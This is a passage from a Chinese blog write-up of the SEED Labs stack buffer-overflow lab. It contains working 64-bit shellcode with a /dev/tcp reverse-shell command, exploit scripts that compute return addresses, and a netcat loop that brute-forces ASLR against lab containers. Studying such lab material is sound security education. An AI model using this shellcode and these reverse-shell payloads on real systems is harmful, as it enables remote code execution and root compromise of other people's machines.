+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server-3-10.9.0.7 | Got a connection from 10.9.0.1</span><br><span class="line">server-3-10.9.0.7 | Starting stack</span><br><span class="line">server-3-10.9.0.7 | Input size: 6</span><br><span class="line">server-3-10.9.0.7 | Frame Pointer (rbp) inside bof():  0x00007fffffffe200</span><br><span class="line">server-3-10.9.0.7 | Buffer&#x27;s address inside bof():     0x00007fffffffe130</span><br><span class="line">server-3-10.9.0.7 | ==== Returned Properly ====</span><br></pre></td></tr></table></figure>
+
+<p>那之前用于32位脚本的东西就用不了了。直接把shellcode_64.py里的shellcode移到exploit.py里，然后安上反弹shell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9999 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>脚本跑一下，这个shellcode长度165。</p>
+<p>手册提到，strcpy()遇到0x00会停止复制（因其也为字符串结束标志），那么就要解决64位机子的地址前面有0x00的问题。那么就可以将返回地址放到最前面。</p>
+<p><em>为什么可以放到最前面？因为shellcode长度165，而缓冲区长度为0x00007fffffffe200-0x00007fffffffe130，长度为208，已经超过了shellcode的长度，所以我们可以把它放到最前面，放到缓冲区中。</em></p>
+<p>那么我们就可以改代码了。改成这样就行了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">0</span>               <span class="comment"># Change this number </span></span><br><span class="line">content[start:start+<span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x00007fffffffe130</span>     <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">0x00007fffffffe200</span> - <span class="number">0x00007fffffffe130</span> + <span class="number">8</span>        <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + <span class="number">8</span>] = (ret).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br></pre></td></tr></table></figure>
+
+<p><em>为什么ret的地址为缓冲区地址？因为payload的一开始就是shellcode（content[start:start+len(shellcode)] &#x3D; shellcode），其地址就为缓冲区刚开始的地址，我们需要把跳转的地址跳转到这里。</em></p>
+<p><em>为什么offset变成了+8？因为是64位的机子，同理offset变为了+8、ret地址也为8byte。（0x00|00|7f|ff|ff|ff|e1|30）</em></p>
+<p>生成payload后发送到服务器，本地监听收到了shell。</p>
+<p>whoami一下，居然是root权限，真实厉害。</p>
+<h2 id="Task5-干掉第四台机子"><a href="#Task5-干掉第四台机子" class="headerlink" title="Task5 干掉第四台机子"></a>Task5 干掉第四台机子</h2><p>netcat传点东西过去，发现不仅是64位，长度居然还只有0x00007fffffffe320-0x00007fffffffe2c0&#x3D;96byte。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server-4-10.9.0.8 | Got a connection from 10.9.0.1</span><br><span class="line">server-4-10.9.0.8 | Starting stack</span><br><span class="line">server-4-10.9.0.8 | Input size: 6</span><br><span class="line">server-4-10.9.0.8 | Frame Pointer (rbp) inside bof():  0x00007fffffffe320</span><br><span class="line">server-4-10.9.0.8 | Buffer&#x27;s address inside bof():     0x00007fffffffe2c0</span><br><span class="line">server-4-10.9.0.8 | ==== Returned Properly ====</span><br></pre></td></tr></table></figure>
+
+
+<p>将 ret 的值设为rbp+n，在这个案例里，n应该可以被设为[1184, 1424]？其目的是越过缓冲区，写入主函数栈和bof()函数栈之间的区域</p>
+<p><em>为什么可以这样设置？看stack.c，源码中存在这样一个“dummy function”。其在主函数栈和bof()栈之间插入了1000个char的空间。</em></p>
+<p><em>那么，我们的shellcode就可以放在这段空间中，所以要求返回地址大于缓冲区。</em></p>
+<p><em>但是按照栈大小和形参实参的储存来计算，可能不是1184。也许是gdb调试的。</em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This function is used to insert a stack frame of size </span></span><br><span class="line"><span class="comment">// 1000 (approximately) between main&#x27;s and bof&#x27;s stack frames. </span></span><br><span class="line"><span class="comment">// The function itself does not do anything. </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dummy_function</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> dummy_buffer[<span class="number">1000</span>];</span><br><span class="line">    <span class="built_in">memset</span>(dummy_buffer, <span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line">    bof(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将 ret 的值设为rbp+1200，并且把payload放到shellcode最后面。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number </span></span><br><span class="line">content[start:] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x00007fffffffe320</span> + <span class="number">1200</span>    <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">0x00007fffffffe320</span> - <span class="number">0x00007fffffffe2c0</span> + <span class="number">8</span>        <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + <span class="number">8</span>] = (ret).to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br></pre></td></tr></table></figure>
+
+<p>生成payload后发送到服务器，本地监听收到了shell。</p>
+<p>whoami一下，居然是root权限，真实厉害。</p>
+<h2 id="Task6-干掉地址随机化机子"><a href="#Task6-干掉地址随机化机子" class="headerlink" title="Task6 干掉地址随机化机子"></a>Task6 干掉地址随机化机子</h2><p>打开地址随机化</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /sbin/sysctl -w kernel.randomize_va_space=2</span><br></pre></td></tr></table></figure>
+
+<p>现在第一台机子地址开始随机了，每次都不一样。生成一个lab1的payload直接用实验报告给的脚本爆破即可，总能随机到payload的地址。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">  </span><br><span class="line">SECONDS=0</span><br><span class="line">value=0</span><br><span class="line"></span><br><span class="line">while true; do</span><br><span class="line">  value=$(( $value + 1 ))</span><br><span class="line">  duration=$SECONDS</span><br><span class="line">  min=$(($duration / 60))</span><br><span class="line">  sec=$(($duration % 60))</span><br><span class="line">  echo &quot;$min minutes and $sec seconds elapsed.&quot;</span><br><span class="line">  echo &quot;The program has been running $value times so far.&quot;</span><br><span class="line">  cat badfile | nc 10.9.0.5 9090</span><br><span class="line">done</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>读一下这个脚本，就是无限循环提交payload碰运气。</p>
+<p>爆破几万次，就拿到shell了，而且是root权限。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 minutes and 48 seconds elapsed.</span><br><span class="line">The program has been running 32034 times so far.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Task7-干掉有其他防御措施的机子"><a href="#Task7-干掉有其他防御措施的机子" class="headerlink" title="Task7 干掉有其他防御措施的机子"></a>Task7 干掉有其他防御措施的机子</h2><h3 id="7-1-StackGuard-Protection"><a href="#7-1-StackGuard-Protection" class="headerlink" title="7.1 StackGuard Protection"></a>7.1 StackGuard Protection</h3><p>重新编译一下stack.c，直接改makefile，去掉–fno-stack-protector的flag就行了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./stack-L1 &lt; badfile</span><br></pre></td></tr></table></figure>
+
+<p>重新编译完了，检测到stack smashing，直接退出了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input size: 517</span><br><span class="line">Frame Pointer (ebp) inside bof():  0xff8f3148</span><br><span class="line">Buffer&#x27;s address inside bof():     0xff8f30d8</span><br><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">Aborted</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-1-Non-executable-Stack-Protection"><a href="#7-1-Non-executable-Stack-Protection" class="headerlink" title="7.1 Non-executable Stack Protection"></a>7.1 Non-executable Stack Protection</h3><p>在 Ubuntu 操作系统中，二进制程序（和共享库）的二进制映像必须声明它们是否需要可执行堆栈。也就是说，它们需要在程序头中标记一个字段。这种标记在默认情况下是由gcc自动完成的，而一般标注堆栈是不可执行的。</p>
+<p>重新编译call_shellcode.c，这个时候去除 -z noexecstack 的 flag。然后尝试编译输出。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
+
+<p>果然就不行了。</p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SEED-Labs-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-number">1.</span> <span class="toc-text">SEED-Labs 缓冲区溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Task1-%E9%AD%94%E6%94%B9shellcode"><span class="toc-number">1.1.</span> <span class="toc-text">Task1 魔改shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task2-%E5%B9%B2%E6%8E%89%E7%AC%AC%E4%B8%80%E5%8F%B0%E6%9C%BA%E5%AD%90"><span class="toc-number">1.2.</span> <span class="toc-text">Task2 干掉第一台机子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task3-%E5%B9%B2%E6%8E%89%E7%AC%AC%E4%BA%8C%E5%8F%B0%E6%9C%BA%E5%AD%90"><span class="toc-number">1.3.</span> <span class="toc-text">Task3 干掉第二台机子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task4-%E5%B9%B2%E6%8E%89%E7%AC%AC%E4%B8%89%E5%8F%B0%E6%9C%BA%E5%AD%90"><span class="toc-number">1.4.</span> <span class="toc-text">Task4 干掉第三台机子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task5-%E5%B9%B2%E6%8E%89%E7%AC%AC%E5%9B%9B%E5%8F%B0%E6%9C%BA%E5%AD%90"><span class="toc-number">1.5.</span> <span class="toc-text">Task5 干掉第四台机子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task6-%E5%B9%B2%E6%8E%89%E5%9C%B0%E5%9D%80%E9%9A%8F%E6%9C%BA%E5%8C%96%E6%9C%BA%E5%AD%90"><span class="toc-number">1.6.</span> <span class="toc-text">Task6 干掉地址随机化机子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task7-%E5%B9%B2%E6%8E%89%E6%9C%89%E5%85%B6%E4%BB%96%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD%E7%9A%84%E6%9C%BA%E5%AD%90"><span class="toc-number">1.7.</span> <span class="toc-text">Task7 干掉有其他防御措施的机子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-StackGuard-Protection"><span class="toc-number">1.7.1.</span> <span class="toc-text">7.1 StackGuard Protection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-Non-executable-Stack-Protection"><span class="toc-number">1.7.2.</span> <span class="toc-text">7.1 Non-executable Stack Protection</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/&text=PWN第一步_seedlabs_stack"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/&title=PWN第一步_seedlabs_stack"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/&is_video=false&description=PWN第一步_seedlabs_stack"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PWN第一步_seedlabs_stack&body=Check out this article: http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/&title=PWN第一步_seedlabs_stack"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/&title=PWN第一步_seedlabs_stack"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/&title=PWN第一步_seedlabs_stack"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/&title=PWN第一步_seedlabs_stack"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/&name=PWN第一步_seedlabs_stack&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/11/05/PWN%E7%AC%AC%E4%B8%80%E6%AD%A5-seedlabs-stack/&t=PWN第一步_seedlabs_stack"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2023
+    ShuiChang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'ShuiChang2019/Utterance_comments_try';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
